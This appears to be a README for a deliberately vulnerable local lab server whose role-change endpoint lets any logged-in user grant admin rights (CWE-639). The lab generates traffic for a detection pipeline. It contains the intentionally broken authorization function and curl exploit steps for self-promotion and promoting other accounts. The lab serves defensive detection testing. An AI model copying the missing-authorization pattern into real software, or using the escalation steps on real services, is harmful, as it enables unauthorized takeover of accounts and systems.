# admin-idor-role

⚠️ **Intentionally vulnerable — local lab only.** This server is deliberately
broken so the repo's network capture / NCER causal-reconciliation pipeline
(`pkg/ncer`, Rust `omnisec-mitm`) has real traffic to detect. It binds to
`127.0.0.1` only and must never be exposed, reused, or deployed anywhere
else.

## Vulnerability: CWE-639 — Insecure Direct Object Reference (broken object-level authorization)

Unlike some of the other labs in this directory, there is **no login
bypass** here — `POST /login` is a real username/password check against a
bcrypt hash, and every endpoint below it requires a genuinely valid session
token. The bug is entirely in what happens *after* a normal user logs in:

`POST /api/users/{id}/role` lets the caller set **any** user's role —
including their own — to `moderator` or `admin`, as long as they present
*some* valid session. The handler never checks:

- whether the caller's own role is `admin` (or `moderator`) before letting
  them grant a role, or
- whether `{id}` refers to the caller's own account.

The entire (buggy) authorization decision is pulled out into one small pure
function, `canChangeRole(caller User, targetID int64, newRole string) bool`
in `main.go`, so the missing check is a single obvious line rather than
buried in HTTP plumbing:

```go
func canChangeRole(caller User, targetID int64, newRole string) bool {
	if !validRoles[newRole] {
		return false
	}
	// BUG (CWE-639): no check that caller.Role == "admin", and no check
	// that targetID == caller.ID.
	return true
}
```

A correct implementation would require `caller.Role == "admin"` (and
arguably still forbid self-promotion). This one just returns `true` for any
authenticated caller, so a freshly-registered plain `user` account can
self-promote to `admin` with a single request.

Whenever a caller changes some *other* user's role to `moderator`/`admin`,
the server logs loudly to stdout, prefixed `[IDOR PRIVESC USED]`. Every role
change (self or other) also fires a best-effort, fire-and-forget async
`POST` to `TRACKER_URL` (if set) describing the change (2s timeout, errors
ignored, never blocks the response) — simulating evidence of the privilege
escalation "phoning home" to the lab's own tracker collector.

## Endpoints

| Method | Path                        | Auth                                  |
|--------|-----------------------------|----------------------------------------|
| POST   | `/login`                    | none (username + password in JSON body) |
| GET    | `/api/me`                   | any valid session token                |
| POST   | `/api/users/{id}/role`      | any valid session token (bug: no admin/ownership check) |

## Running

```sh
export DATABASE_URL='postgres://labs:labs_lab_pw@127.0.0.1:55432/labs_admin_idor_role?sslmode=disable'
export LISTEN_ADDR='127.0.0.1:18003'   # default
go run .
```

Schema + seed data: `labs/servers/db/postgres/init/03-admin-idor-role.sql`
(seeds a `user`, a `moderator`, and an `admin` account with fake local-only
passwords documented in that file).

## Exploit

Log in as the plain `user` account (`alice` / `alice_lab_pw1`), grab the
session token, then call the role endpoint on **your own** user id to
self-promote to `admin` — no admin credentials involved anywhere:

```sh
# 1. Real login as a plain "user" account.
TOKEN=$(curl -s -X POST http://127.0.0.1:18003/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"alice","password":"alice_lab_pw1"}' | jq -r .token)

# 2. Confirm we're logged in as a regular user.
curl -s -H "Authorization: Bearer $TOKEN" http://127.0.0.1:18003/api/me
# -> {"id":1,"username":"alice","role":"user"}

# 3. Exploit: call the role endpoint on our OWN id. Nothing here requires
#    admin privileges -- the missing check is entirely server-side.
curl -s -X POST http://127.0.0.1:18003/api/users/1/role \
  -H "Authorization: Bearer $TOKEN" \
  -H 'Content-Type: application/json' \
  -d '{"role":"admin"}'
# -> {"id":1,"role":"admin"}

# 4. Confirm the escalation stuck.
curl -s -H "Authorization: Bearer $TOKEN" http://127.0.0.1:18003/api/me
# -> {"id":1,"username":"alice","role":"admin"}
```

Because `1` here is the caller's own id, the server does *not* print
`[IDOR PRIVESC USED]` for this exact call (that log line is specifically for
changing *someone else's* role) — but the self-promotion is just as real a
break of the intended privilege model. To see the loud log line, log in as
`alice` and instead target `morgan`'s or `root_admin`'s id (`2` or `3`):

```sh
curl -s -X POST http://127.0.0.1:18003/api/users/2/role \
  -H "Authorization: Bearer $TOKEN" \
  -H 'Content-Type: application/json' \
  -d '{"role":"admin"}'
# -> {"id":2,"role":"admin"}, and stdout prints:
# [IDOR PRIVESC USED] caller=alice(id=1,role=user) set user_id=2 role=admin
```

## What the ncer/mitm pipeline should flag

The network evidence this lab produces is a sequence of otherwise-ordinary,
correctly-authenticated HTTP calls: a successful `POST /login` for a plain
`user` account, followed shortly after by a `POST /api/users/{id}/role`
call from that *same* session that grants `moderator`/`admin` — a
capability the login step never actually conferred.

In NCER terms (see `docs/ncer/Reconciliation.md`), this is exactly the
`d_authority` / `d_capability` shape: the `POST /login` response should be
recorded as an `AuthorityGrant` scoped to the `user` role's permissions,
and the subsequent role-change call is an `AuthorityObserved` action that
requires an `admin`-level permission. `bind_authority`/`score_authority`
should see:

- **authority-granted**: `AuthorityGrant` for `subject_id=alice`,
  permission class `role:user` (from the login response), but no grant for
  `role:admin` capabilities.
- **authority-used**: `AuthorityObserved` for `alice` performing a
  `role_change` action requiring `role:admin`.

The mismatch between what was granted at login (`role:user`) and what was
exercised immediately after (`role:admin`-level capability, with no
intervening re-authentication or elevation event) is precisely the
authority-granted vs. authority-used discrepancy `d_authority` is designed
to surface — a live instance of the CWE-639 IDOR/privilege-escalation
incident class, without needing to understand this server's source code at
all.

## Docker

```sh
docker build -t labs-admin-idor-role .
```

`docker-compose` port mapping (host stays loopback-only):

```yaml
services:
  admin-idor-role:
    build: .
    ports:
      - "127.0.0.1:18003:18003"
    environment:
      DATABASE_URL: postgres://labs:labs_lab_pw@postgres:5432/labs_admin_idor_role?sslmode=disable
```

## Tests

```sh
go test ./... -v
```

Tests run entirely against an in-memory `memStore` fake (see
`memstore_test.go`) — no live Postgres is required. `main_test.go` covers:

- `TestCanChangeRole_DocumentsIDORBug` — calls `canChangeRole` directly to
  show a plain `user` caller is (incorrectly) allowed to set an arbitrary
  other user's role to `admin`.
- `TestEndToEnd_SelfPromotionViaIDOR` — a full `httptest.NewServer` flow:
  real login as a `user`, self-promote via the vulnerable endpoint, then
  confirm `GET /api/me` reflects the escalated `admin` role.
- `TestUnauthenticated_CannotChangeRole` — a control showing the endpoint
  still requires *some* valid session (the bug is missing authorization,
  not missing authentication).
